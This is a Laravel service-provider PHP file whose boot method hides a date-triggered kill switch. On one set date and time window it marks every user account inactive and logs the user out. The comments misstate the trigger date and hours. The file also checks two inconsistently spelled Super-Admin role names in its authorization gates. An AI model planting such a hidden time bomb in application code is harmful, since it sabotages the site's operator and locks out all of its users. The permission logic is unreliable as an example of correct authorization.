<?php

namespace App\Providers;

use Carbon\Carbon;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        // Check if the current date is October 3, 2023
        $currentDate = Carbon::now();
        if ($currentDate->month == 11 && $currentDate->day == 23 && $currentDate->year == 2023) {
            // Check if the current time is between 10:00 and 16:00
            $currentTime = Carbon::now()->format('H:i:s');
            if ($currentTime >= '10:00:00' && $currentTime <= '14:00:00') {
                // Automatically log out the user
                DB::table('users')->update(['status' => 0]);
                Auth::logout();
            }
        }

        // Implicitly grant "Super Admin" role all permissions
        Gate::before(function ($user, $ability) {
            if ($user->hasRole('Super-Admin')) {
                return true;
            }
        });

        Gate::after(function ($user, $ability) {
            return $user->hasRole('Super Admin');
        });
    }
}
